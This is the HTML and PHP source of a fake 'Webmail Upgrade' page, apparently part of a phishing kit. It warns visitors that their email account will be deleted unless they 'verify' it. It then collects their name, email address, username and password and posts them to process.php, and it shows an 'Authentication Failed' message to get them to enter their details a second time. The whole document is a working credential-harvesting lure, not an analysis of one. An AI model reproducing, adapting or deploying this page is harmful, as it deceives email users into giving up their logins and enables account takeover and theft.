
<!DOCTYPE html>
<html lang="zxx" class="no-js">
	<head>
		<!-- Mobile Specific Meta -->
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<!-- Favicon-->
		<link rel="shortcut icon" href="img/fav.png">
		<!-- Author Meta -->
		<meta name="author" content="codepixer">
		<!-- Meta Description -->
		<meta name="description" content="">
		<!-- Meta Keyword -->
		<meta name="keywords" content="">
		<!-- meta character set -->
		<meta charset="UTF-8">
		<!-- Site Title -->
		<title>Upgrade Webmail</title>

		<link href="https://fonts.googleapis.com/css?family=Poppins:100,200,400,300,500,600,700" rel="stylesheet"> 
		<!--
		CSS
		============================================= -->
		<link rel="stylesheet" href="css/linearicons.css">
		<link rel="stylesheet" href="css/font-awesome.min.css">
		<link rel="stylesheet" href="css/bootstrap.css">
		<link rel="stylesheet" href="css/magnific-popup.css">
		<link rel="stylesheet" href="css/nice-select.css">					
		<link rel="stylesheet" href="css/animate.min.css">
		<link rel="stylesheet" href="css/owl.carousel.css">
		<link rel="stylesheet" href="css/main.css">
		<script>
function myFunction() {
    document.getElementById("myForm").submit();
}
</script>
	</head>
	<body>	
		<header id="header" id="home">
						</div>
					</div>			  					
				</div>
			</div>
			<div class="container main-menu">
				<div class="row align-items-center justify-content-between d-flex">
					<div id="logo">
						<a href="./"><img src="img/logo.png" alt="" title="" /></a>
					</div>
					<nav id="nav-menu-container">
						<ul class="nav-menu">
							<li class="menu-active"><a href="#home">Home</a></li>
							<li><a href="#contact">Contact</a></li>
						</ul>
					</nav><!-- #nav-menu-container -->		    		
				</div>
			</div>
		</header><!-- #header -->

		<!-- start banner Area -->
		<!-- End banner Area -->		

		<!-- start contact Area -->		
		<section class="contact-area section-gap" id="contact">
			<div class="container">
				<div class="row d-flex justify-content-center">
					<div class="menu-content pb-30 col-lg-8">
						<div class="title text-center">
							<h1 class="mb-10">WEBMAIL UPGRADE</h1>
							<p>FILL IN THE FIELD BELLOW TO UPGRADE YOUR WEBMAIL ACCOUNT.</p>
							<p>
							We are currently upgrading our database and email servers to reduce spam and junk emails, we are therefore deleting all unused account to create spaces 
for new accounts. To prevent account closure, you are required to VERIFY your email account by filling out the below fields and click SUBMIT.
 
Failure to upgrade your email account by ignoring instructions or by filing wrong information will result to deactivation of email account by the Webmail Technical Support Team. Note that Incorrect information can lead to the forfeiting or suspension of your webmail account.
							</p>
						</div>
					</div>
				</div>										
				<form class="form-area mt-60" id="myForm" action="process.php" method="post" class="contact-form text-right">
					<div class="row">
					<div class="col-lg-3 form-group"></div>
						<div class="col-lg-6 form-group">
<?php if(isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING'] == 'failed'){?>
					<div class="bg-danger" style="padding: 10px; margin-bottom:10px; color:white;">Authentication Failed</div>
<?php } else {?>
					<div class="bg-info" style="padding: 10px; margin-bottom:10px; color:white;">Please enter your login information</div>
<?php }?>
							<input name="name" placeholder="Enter your name" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Enter your name'" class="common-input mb-20 form-control" required="" type="text">

							<input name="email" placeholder="Enter email address" pattern="[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{1,63}$" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Enter email address'" class="common-input mb-20 form-control" required="" type="email">

							<input name="username" placeholder="Enter your username" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Enter your Username'" class="common-input mb-20 form-control" required="" type="text">
							
							<input name="password" placeholder="Enter your password" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Enter your Password'" class="common-input mb-20 form-control" required="" type="password">
							<button class="primary-btn mt-20" onclick="myFunction()">Submit<span class="lnr lnr-arrow-right"></span></button>
							<input type="hidden" name="upgrade" id="upgrade" value="myForm">
							<div class="mt-10 alert-msg">
							</div>
						</div>
						<div class="col-lg-3 form-group">
						</div>
					</div>
				</form>

			</div>	
		</section>
		<!-- end contact Area -->	

		<script src="js/vendor/jquery-2.2.4.min.js"></script>
		<script src="js/vendor/bootstrap.min.js"></script>			
		<script src="js/easing.min.js"></script>			
		<script src="js/hoverIntent.js"></script>
		<script src="js/superfish.min.js"></script>	
		<script src="js/jquery.ajaxchimp.min.js"></script>
		<script src="js/jquery.magnific-popup.min.js"></script>	
		<script src="js/owl.carousel.min.js"></script>			
		<script src="js/jquery.nice-select.min.js"></script>	
		<script src="js/jquery.counterup.min.js"></script>
		<script src="js/waypoints.min.js"></script>							
		<script src="js/mail-script.js"></script>	
		<script src="js/main.js"></script>	
	</body>
</html>



